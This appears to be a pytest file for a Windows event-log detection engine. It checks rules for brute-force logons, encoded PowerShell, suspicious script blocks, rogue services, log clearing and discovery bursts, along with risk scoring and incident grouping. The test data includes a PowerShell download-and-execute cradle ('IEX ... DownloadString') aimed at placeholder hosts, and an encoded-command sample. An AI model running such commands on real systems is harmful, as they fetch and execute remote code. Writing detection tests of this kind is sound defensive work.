import json
import uuid
from datetime import datetime, timedelta

from app.analysis.risk import compute_risk
from app.detection.engine import run_detection
from app.models import Detection, Event, Incident

BASE_TIME = datetime(2026, 10, 21, 5, 0, 0)


def _event(event_id, minutes=0, **overrides):
    defaults = dict(
        id=str(uuid.uuid4()),
        record_id=None,
        source="agent",
        host="HOST-A",
        timestamp=BASE_TIME + timedelta(minutes=minutes),
        channel="Security",
        provider="Microsoft-Windows-Security-Auditing",
        event_id=event_id,
        user=None,
        process=None,
        command_line=None,
        parent_process=None,
        src_ip=None,
        logon_type=None,
        message=None,
        raw="{}",
    )
    defaults.update(overrides)
    return Event(**defaults)


def _rule_names(db_session):
    return {d.rule_name for d in db_session.query(Detection).all()}


def test_brute_force_detected_at_five_failed_logons(db_session):
    for i in range(5):
        db_session.add(_event(4625, minutes=i * 0.5, user="fakeuser"))
    db_session.commit()

    run_detection(db_session)

    detections = db_session.query(Detection).filter(Detection.rule_name == "Brute force logon").all()
    assert len(detections) == 1
    assert detections[0].event_count == 5


def test_brute_force_not_detected_below_threshold(db_session):
    for i in range(4):
        db_session.add(_event(4625, minutes=i * 0.5, user="fakeuser"))
    db_session.commit()

    run_detection(db_session)

    assert "Brute force logon" not in _rule_names(db_session)


def test_encoded_powershell_detected(db_session):
    db_session.add(_event(4688, command_line="powershell.exe -enc SGVsbG8="))
    db_session.commit()

    run_detection(db_session)

    assert "Encoded PowerShell command" in _rule_names(db_session)


def test_plain_powershell_not_flagged_as_encoded(db_session):
    db_session.add(_event(4688, command_line="powershell.exe -File script.ps1"))
    db_session.commit()

    run_detection(db_session)

    assert "Encoded PowerShell command" not in _rule_names(db_session)


def test_suspicious_scriptblock_detected(db_session):
    db_session.add(_event(4104, channel="Microsoft-Windows-PowerShell/Operational", command_line="IEX (New-Object Net.WebClient).DownloadString('http://x')"))
    db_session.commit()

    run_detection(db_session)

    assert "Suspicious PowerShell script block" in _rule_names(db_session)


def test_admin_group_add_detected_only_for_administrators_group(db_session):
    db_session.add(
        _event(4732, user="attacker", message="A member was added.\r\nGroup:\r\n\tGroup Name:\tAdministrators")
    )
    db_session.commit()

    run_detection(db_session)

    assert "User added to local Administrators" in _rule_names(db_session)


def test_adding_to_non_admin_group_not_flagged(db_session):
    db_session.add(_event(4732, user="ashwin", message="A member was added.\r\nGroup:\r\n\tGroup Name:\tUsers"))
    db_session.commit()

    run_detection(db_session)

    assert "User added to local Administrators" not in _rule_names(db_session)


def test_service_outside_trusted_paths_flagged(db_session):
    db_session.add(_event(7045, process="Evil Svc", command_line=r"C:\Users\ashwin\AppData\Local\Temp\evil.exe"))
    db_session.commit()

    run_detection(db_session)

    assert "New service installed outside trusted paths" in _rule_names(db_session)


def test_service_inside_program_files_not_flagged(db_session):
    db_session.add(_event(7045, process="Good Svc", command_line=r'"C:\Program Files\Vendor\svc.exe"'))
    db_session.commit()

    run_detection(db_session)

    assert "New service installed outside trusted paths" not in _rule_names(db_session)


def test_service_inside_system32_not_flagged(db_session):
    db_session.add(_event(7045, process="Driver", command_line=r"system32\drivers\wd\KslD.sys"))
    db_session.commit()

    run_detection(db_session)

    assert "New service installed outside trusted paths" not in _rule_names(db_session)


def test_repeated_filter_rule_hits_grouped_into_one_detection(db_session):
    for i in range(3):
        db_session.add(
            _event(
                4104,
                minutes=i,
                channel="Microsoft-Windows-PowerShell/Operational",
                command_line="IEX (New-Object Net.WebClient).DownloadString('http://x')",
            )
        )
    db_session.commit()

    run_detection(db_session)

    detections = db_session.query(Detection).filter(Detection.rule_name == "Suspicious PowerShell script block").all()
    assert len(detections) == 1
    assert detections[0].event_count == 3
    assert len(json.loads(detections[0].matched_event_ids)) == 3


def test_filter_rule_hits_far_apart_create_separate_time_bound_detections(db_session):
    """Regression test: filter-kind rules used to group every matching event on
    a host into one detection regardless of how far apart they occurred, which
    could span a detection (and the incident built from it) across months.
    Hits more than FILTER_RULE_WINDOW_MINUTES apart must split into separate
    detections instead."""
    db_session.add(
        _event(
            4104,
            minutes=0,
            channel="Microsoft-Windows-PowerShell/Operational",
            command_line="IEX (New-Object Net.WebClient).DownloadString('http://x')",
        )
    )
    db_session.add(
        _event(
            4104,
            minutes=60 * 24 * 90,  # ~90 days later
            channel="Microsoft-Windows-PowerShell/Operational",
            command_line="IEX (New-Object Net.WebClient).DownloadString('http://y')",
        )
    )
    db_session.commit()

    run_detection(db_session)

    detections = db_session.query(Detection).filter(Detection.rule_name == "Suspicious PowerShell script block").all()
    assert len(detections) == 2
    for d in detections:
        assert d.last_seen - d.first_seen < timedelta(minutes=30)

    incidents = db_session.query(Incident).all()
    assert len(incidents) == 2


def test_log_cleared_detected(db_session):
    db_session.add(_event(1102, user="attacker"))
    db_session.commit()

    run_detection(db_session)

    assert "Security/System event log cleared" in _rule_names(db_session)


def test_discovery_burst_detected(db_session):
    db_session.add(_event(4688, minutes=0, process="whoami.exe", command_line="whoami"))
    db_session.add(_event(4688, minutes=0.5, process="net.exe", command_line="net user"))
    db_session.commit()

    run_detection(db_session)

    assert "Discovery command burst" in _rule_names(db_session)


def test_single_discovery_command_not_flagged(db_session):
    db_session.add(_event(4688, process="whoami.exe", command_line="whoami"))
    db_session.commit()

    run_detection(db_session)

    assert "Discovery command burst" not in _rule_names(db_session)


def test_user_created_and_scheduled_task_detected(db_session):
    db_session.add(_event(4720, user="ashwin"))
    db_session.add(_event(4698, user="ashwin", command_line="<Command>notepad.exe</Command>"))
    db_session.commit()

    run_detection(db_session)

    names = _rule_names(db_session)
    assert "Local user account created" in names
    assert "Scheduled task created" in names


def test_risk_score_matches_formula():
    score, level = compute_risk(severity=8, confidence=0.9, count=5)
    # frequency_factor = min(2, 1 + log2(5)/4) ~= 1.5805
    assert score == round(min(100.0, 8 * 10 * 0.9 * (1 + __import__("math").log2(5) / 4)), 1)
    assert level == "Critical"


def test_risk_level_thresholds():
    assert compute_risk(severity=7, confidence=1.0, count=1)[1] == "High"  # 7*10*1*1 = 70
    assert compute_risk(severity=1, confidence=0.1, count=1)[1] == "Low"  # 1*10*0.1*1 = 1


def test_incident_groups_nearby_detections_on_same_host(db_session):
    db_session.add(_event(4720, minutes=0, user="ashwin"))
    db_session.add(_event(4732, minutes=1, user="attacker", message="Group Name:\tAdministrators"))
    db_session.commit()

    run_detection(db_session)

    incidents = db_session.query(Incident).all()
    assert len(incidents) == 1
    assert incidents[0].detection_count == 2


def test_incident_splits_when_detections_are_far_apart(db_session):
    db_session.add(_event(4720, minutes=0, user="ashwin"))
    db_session.add(_event(4698, minutes=120, user="ashwin"))  # 2 hours later, outside the 30 min gap
    db_session.commit()

    run_detection(db_session)

    incidents = db_session.query(Incident).all()
    assert len(incidents) == 2


def test_rerun_detection_is_idempotent(db_session):
    db_session.add(_event(4720, user="ashwin"))
    db_session.commit()

    run_detection(db_session)
    first_ids = {d.id for d in db_session.query(Detection).all()}

    run_detection(db_session)
    second_ids = {d.id for d in db_session.query(Detection).all()}

    assert first_ids == second_ids
    assert len(first_ids) == 1
